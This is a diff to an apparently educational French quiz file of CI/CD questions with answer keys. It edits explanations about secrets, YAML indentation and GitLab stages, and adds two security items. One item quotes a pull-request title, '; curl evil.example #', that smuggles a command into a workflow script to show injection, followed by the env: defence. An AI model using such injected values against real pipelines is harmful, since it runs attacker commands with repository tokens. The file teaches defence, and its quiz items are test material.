@@ -75,7 +75,7 @@
    "Dans un message de commit"
   ],
   "answer": 0,
-  "explain": "Le stockage de secrets de la CI (secrets GitHub, variables CI de GitLab) garde les mots de passe hors du code : ils sont masqués dans les logs des jobs et n'arrivent jamais dans git. Tout ce qui est écrit dans le YAML, le README ou un message de commit est lisible par quiconque peut lire le dépôt. Ne donne chaque secret qu'aux jobs qui en ont besoin."
+  "explain": "Le stockage de secrets de la CI (secrets GitHub, variables CI de GitLab) garde les mots de passe hors du code : ils n'arrivent jamais dans git, et les logs des jobs les masquent (une aide, pas une garantie : n'en affiche jamais). Tout ce qui est écrit dans le YAML, le README ou un message de commit est lisible par quiconque peut lire le dépôt. Ne donne chaque secret qu'aux jobs qui en ont besoin."
  },
  {
   "id": "cicd-1-07",
@@ -127,7 +127,7 @@
    "Les lignes vides"
   ],
   "answer": 0,
-  "explain": "Le YAML s'écrit comme un plan : une ligne poussée plus à droite appartient à la ligne au-dessus, et chaque niveau est 2 espaces plus à droite. Quand une ligne n'est pas alignée avec celles dont elle fait partie, le fichier ne dit plus ce que tu voulais : le pipeline casse, ou une étape se retrouve dans un autre job. Seulement des espaces, jamais de tabulations."
+  "explain": "Le YAML s'écrit comme un plan : une ligne poussée plus à droite appartient à la ligne au-dessus, et chaque niveau est en général 2 espaces plus à droite (le nombre est libre). Quand une ligne n'est pas alignée avec celles dont elle fait partie, le fichier ne dit plus ce que tu voulais : le pipeline casse, ou une étape se retrouve dans un autre job. Seulement des espaces, jamais de tabulations."
  },
  {
   "id": "cicd-1-11",
@@ -140,12 +140,12 @@
    "Il ne tourne que la nuit"
   ],
   "answer": 0,
-  "explain": "when: manual met le job dans le pipeline sans le lancer : un bouton lecture apparaît sur la page du pipeline, et le job tourne quand quelqu'un qui en a le droit clique dessus. C'est une sécurité simple pour les déploiements en production : les tests tournent tout seuls, un humain décide quand livrer."
+  "explain": "when: manual met le job dans le pipeline sans le lancer : un bouton lecture apparaît sur la page du pipeline, et le job tourne quand quelqu'un qui en a le droit clique dessus. Seul, il n'arrête pas le pipeline : les stages suivants continuent. Dans rules:, le pipeline attend (bloqué) qu'on clique."
  },
  {
   "id": "cicd-1-12",
   "level": 1,
-  "q": "GitLab refuse ton pipeline : 'unit job: chosen stage does not exist'. Que vérifies-tu ?",
+  "q": "GitLab refuse ton pipeline : 'unit job: chosen stage tests does not exist; available stages are .pre, build, test, deploy, .post'. Que vérifies-tu ?",
   "choices": [
    "Que le stage: du job est listé sous stages:",
    "Que le runner est en ligne",
@@ -153,7 +153,7 @@
    "Que le job a une image:"
   ],
   "answer": 0,
-  "explain": "stages: en haut de .gitlab-ci.yml liste les étapes dans l'ordre où elles tournent, et le stage: de chaque job doit en faire partie. Une faute comme tests au lieu de test suffit pour que GitLab refuse tout le fichier, avant qu'un seul job tourne. La page de lint de la CI (CI/CD > Editor) montre ces erreurs pendant que tu tapes."
+  "explain": "stages: en haut de .gitlab-ci.yml liste les étapes dans l'ordre où elles tournent, et le stage: de chaque job doit en faire partie. Une faute comme tests au lieu de test suffit pour que GitLab refuse tout le fichier, avant qu'un seul job tourne. L'éditeur de pipeline (Build > Pipeline editor) montre ces erreurs pendant que tu tapes."
  },
  {
   "id": "cicd-1-13",
@@ -166,7 +166,7 @@
    "Juste un avertissement dans les logs"
   ],
   "answer": 0,
-  "explain": "Le YAML s'écrit comme un plan : les lignes qui vont ensemble commencent au même endroit, et chaque niveau est 2 espaces plus à droite. Une ligne décalée n'appartient plus à ce que tu voulais : GitHub refuse le fichier, ou la lit comme faisant partie d'autre chose. Un éditeur qui connaît le YAML montre le plan et aide à aligner."
+  "explain": "Le YAML s'écrit comme un plan : les lignes qui vont ensemble commencent au même endroit, et chaque niveau est en général 2 espaces plus à droite. Une ligne décalée n'appartient plus à ce que tu voulais : GitHub refuse le fichier, ou la lit comme faisant partie d'autre chose. Un éditeur qui connaît le YAML montre le plan et aide à aligner."
  },
  {
   "id": "cicd-2-01",
@@ -336,5 +336,31 @@
   ],
   "answer": 0,
   "explain": "Un workflow qui tourne sur push et pull_request tourne pour chaque branche et chaque pull request. Sans condition, chacune déploierait en production. github.ref est le nom complet de ce qui a lancé le passage : refs/heads/main pour la branche main. Avec ce if, les autres passages testent quand même, mais sautent le déploiement."
+ },
+ {
+  "id": "cicd-2-14",
+  "level": 2,
+  "q": "Une étape d'un workflow lance : echo \"${{ github.event.pull_request.title }}\". Pourquoi est-ce dangereux ?",
+  "choices": [
+   "Le titre devient une partie du script",
+   "Le titre peut être trop long pour echo",
+   "echo ne sait pas afficher les variables GitHub",
+   "Ça ne marche que sur la branche main"
+  ],
+  "answer": 0,
+  "explain": "${{ }} est remplacé avant que le shell tourne : le titre de la PR devient une partie du script. Un titre comme \"; curl evil.example #\" lance cette commande, avec le jeton du job. Passe le texte non fiable par env: (TITLE: ${{ github.event.pull_request.title }}) et utilise \"$TITLE\" dans le script : il reste du texte."
+ },
+ {
+  "id": "cicd-2-15",
+  "level": 2,
+  "q": "Pourquoi un workflow pull_request_target qui récupère le code de la PR est-il dangereux ?",
+  "choices": [
+   "Un fork lance son code avec tes secrets",
+   "Il lance les tests deux fois",
+   "Il ne tourne que sur les forks",
+   "Il ne peut pas lire le dépôt"
+  ],
+  "answer": 0,
+  "explain": "pull_request_target tourne dans le contexte de ton dépôt, avec ses secrets et un jeton qui peut écrire. Récupère le code de la PR là-dedans, et le fork d'un inconnu lance son propre code avec. Pour tester du code extérieur, utilise pull_request : pas de secrets, jeton en lecture seule. Ne récupère jamais de code non fiable dans pull_request_target."
  }
 ]
